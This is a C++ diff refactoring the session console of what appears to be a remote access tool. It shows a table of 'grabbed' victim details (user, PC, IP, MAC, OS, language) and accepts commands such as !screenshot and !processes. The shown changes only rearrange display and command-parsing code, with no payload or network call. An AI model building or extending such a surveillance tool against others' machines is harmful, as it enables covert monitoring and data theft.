@@ -18,23 +18,20 @@
 #include "main.h"
 #include "transfer.h"
 #include "sessionSelecter.h"
+#include "modules.h"
 
 
 
-void Choose(string logo, int choose)
+void Choose(int choose)
 {
 	HANDLE  hConsole;
 	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	FlushConsoleInputBuffer(hConsole);
 	int col = 9;
-	bool logoShow = true;
-	string space = "          ";
 	string command = "";
 	string line = "";
 	string something = "";
 	string curentUSER = "";
-	
-	logoShow= true;
 	string ip = "";
 	string pc = "";
 	string use = "";
@@ -42,12 +39,9 @@ void Choose(string logo, int choose)
 	string mac = "";
 	string os = "";
 	string lang = "";
-	int counte = 0;
+	int count = 0;
 	system("cls");
-	string user = "Modules\\Grabbed\\users.txt";
-	string proc = "Modules\\Grabbed\\processes.txt";
 	string path = "";
-	string comands_session = "Modules\\Commands\\Session.txt";
 	col = 8;
 	SetConsoleTextAttribute(hConsole, col);
 	printf("Enter the path for downloading files: ");
@@ -55,75 +49,72 @@ void Choose(string logo, int choose)
 	SetConsoleTextAttribute(hConsole, col);
 	cin >> path;
 	system("cls");
+
+	col = 13;
+	SetConsoleTextAttribute(hConsole, col);
+	cout << Modules::logo << endl;
+	col = 9;
+	SetConsoleTextAttribute(hConsole, col);
+	printf("--------------------------------------------------------------------------------------------------------------------------\n");
+	printf("|                                                    Sessions num %2d                                                    |\n", choose);
+	printf("--------------------------------------------------------------------------------------------------------------------------\n");
+	printf("|            User|              PC|              IP|               MAC|            Install_date|           OS|   Language|\n");
+	printf("--------------------------------------------------------------------------------------------------------------------------\n");
+	ifstream file(Modules::user);
+	if (file.is_open())
+	{
+		while (getline(file, line))
+		{
+			if (count == 0 + (7 * choose))
+				use = line;
+			if (count == 1 + (7 * choose))
+				pc = line;
+			if (count == 2 + (7 * choose))
+				ip = line;
+			if (count == 3 + (7 * choose))
+				mac = line;
+			if (count == 4 + (7 * choose))
+				date = line;
+			if (count == 5 + (7 * choose))
+				os = line;
+			if (count == 6 + (7 * choose))
+			{
+				lang = line;
+				printf("|%16s|%16s|%16s|%18s|%24s|%13s|%11s|\n", use.c_str(), pc.c_str(), ip.c_str(), mac.c_str(), date.c_str(), os.c_str(), lang.c_str());
+				printf("--------------------------------------------------------------------------------------------------------------------------\n");
+			}
+			count++;
+		}
+	}
+	else
+	{
+
+		col = 4;
+		SetConsoleTextAttribute(hConsole, col);
+		printf("Fatal ERROR!!!\n");
+	}
+	file.close();
+	line = "";
+	col = 9;
+	SetConsoleTextAttribute(hConsole, col);
+	printf("Hi %s!!!\n   !help ==for==> command list\n", curentUSER.c_str());
+
 	while (true)
 	{
-		if (logoShow)
-		{
-			col = 13;
-			SetConsoleTextAttribute(hConsole, col);
-			cout << logo << endl;
-			col = 9;
-			SetConsoleTextAttribute(hConsole, col);
-			printf("--------------------------------------------------------------------------------------------------------------------------\n");
-			printf("|                                                    Sessions num %2d                                                    |\n", choose);
-			printf("--------------------------------------------------------------------------------------------------------------------------\n");
-			printf("|            User|              PC|              IP|               MAC|            Install_date|           OS|   Language|\n");
-			printf("--------------------------------------------------------------------------------------------------------------------------\n");
-			ifstream file(user);
-			if (file.is_open())
-			{
-				while (getline(file, line))
-				{
-					if (counte == 0 + (7 * choose))
-						use = line;
-					if (counte == 1 + (7 * choose))
-						pc = line;
-					if (counte == 2 + (7 * choose))
-						ip = line;
-					if (counte == 3 + (7 * choose))
-						mac = line;
-					if (counte == 4 + (7 * choose))
-						date = line;
-					if (counte == 5 + (7 * choose))
-						os = line;
-					if (counte == 6 + (7 * choose))
-					{
-						lang = line;
-						printf("|%16s|%16s|%16s|%18s|%24s|%13s|%11s|\n", use.c_str(), pc.c_str(), ip.c_str(), mac.c_str(), date.c_str(), os.c_str(), lang.c_str());
-						printf("--------------------------------------------------------------------------------------------------------------------------\n");
-					}
-					counte++;
-				}
-			}
-			else
-			{
-
-				col = 4;
-				SetConsoleTextAttribute(hConsole, col);
-				printf("Fatal ERROR!!!\n");
-			}
-			file.close();
-			line = "";
-			col = 9;
-			SetConsoleTextAttribute(hConsole, col);
-			printf("Hi %s!!!\n   !help ==for==> command list\n", curentUSER.c_str());
-		}
 		col = 6;
 		SetConsoleTextAttribute(hConsole, col);
 		printf(">>> ");
 		col = 11;
 		SetConsoleTextAttribute(hConsole, col);
 		cin >> command;
-		logoShow = false;
 		if (command == "!help")
 		{
-			Help(comands_session);
+			Help(Modules::commands_session);
 
 		}
 		if (command == "!menu")
 		{
 			system("cls");
-			logoShow = true;
 			break;
 		}
 		if (command == "!screenshot")
@@ -942,7 +933,7 @@ void Choose(string logo, int choose)
 		}
 		if (command == "!processes")
 		{
-			Help(proc);
+			Help(Modules::proc);
 
 
 		}
